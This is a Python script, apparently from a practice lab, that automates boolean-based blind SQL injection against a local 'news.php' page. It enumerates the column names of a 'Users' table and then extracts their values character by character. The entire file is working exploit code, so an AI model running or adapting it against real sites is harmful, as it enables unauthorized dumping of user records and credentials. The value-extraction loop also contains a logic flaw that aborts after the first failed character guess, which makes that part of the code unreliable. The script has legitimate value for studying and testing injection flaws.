import requests
import string

def condicion_logica(inyeccion):
    r = requests.get("http://localhost/news.php", params={"id": inyeccion})

    if "NOTICIAS" in r.text:
        return True
    else:
        return False

def extrae_nombre_columnas(max_columns=10, max_len=20):
    columns = []

    for col_index in range(0, max_columns):
        name = ""
        for pos in range(1, max_len + 1):
            for c in string.ascii_letters:
                inyeccion = f"""
                1 AND SUBSTRING(
                (
                    SELECT COLUMN_NAME
                    FROM INFORMATION_SCHEMA.COLUMNS
                    WHERE TABLE_SCHEMA = database()
                    AND TABLE_NAME = 'Users'
                    LIMIT {col_index},1
                ),
                {pos},1
                ) = '{c}'
                """
                if condicion_logica(inyeccion):
                    name += c
                    break

        if name:
            columns.append(name)
            print(f"Columna encontrada: {name}")
        else:
            break

    return columns

def extrae_valor_columna(columna, max_rows=10, max_len=50):
    print(f"\nExtrae valor de columna: {columna}")

    for row in range(0, max_rows):
        value = ""
        for pos in range(1, max_len + 1):
            for c in string.printable:
                inyeccion = f"""
                1 AND LENGTH(
                    (SELECT {columna} FROM Users LIMIT {row},1)
                ) >= {pos}
                AND SUBSTRING(
                    (SELECT {columna} FROM Users LIMIT {row},1),
                    {pos},1
                ) = '{c}'
                """
                
                if condicion_logica(inyeccion):
                    value += c
                    break
                else:
                    break

        if value:
            print(f"- {value}")
        else:
            break

if __name__ == "__main__":
    print("Columnas de Users: \n")
    cols = extrae_nombre_columnas()

    for col in cols:
        extrae_valor_columna(col)
